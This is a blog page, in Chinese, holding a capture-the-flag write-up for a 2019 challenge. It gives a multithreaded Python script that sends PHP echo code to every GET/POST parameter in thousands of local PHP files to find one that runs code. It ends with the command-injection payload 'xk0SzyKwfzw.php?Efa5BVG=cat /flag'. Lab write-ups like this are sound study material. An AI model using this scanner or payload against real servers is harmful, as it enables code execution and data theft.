@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[强网杯 2019]高明的黑客 | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[强网杯 2019]高明的黑客</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/10
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516210127863.png" alt="image-20240516210127863" style="zoom:80%;" />
+
+<p>下载源码之后解压</p>
+<p>发现了三千多文件，要找到可以用的参数</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#x27;开始时间：  &#x27;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath = r&quot;D:\phpstudy_pro\WWW\src&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#x27;trying   &#x27;+file+ &#x27;     &#x27;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&#x27;utf-8&#x27;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">            posts = list(re.findall(&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">    data = &#123;&#125;														#所有的$_POST</span><br><span class="line">    params = &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    url = &#x27;http://127.0.0.1/src/&#x27;+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1:													#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&#x27;找到了利用文件： &#x27;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终找到了利用文件： xk0SzyKwfzw.php </p>
+<p>找到了利用的参数：Efa5BVG</p>
+<p>最后构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>找到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
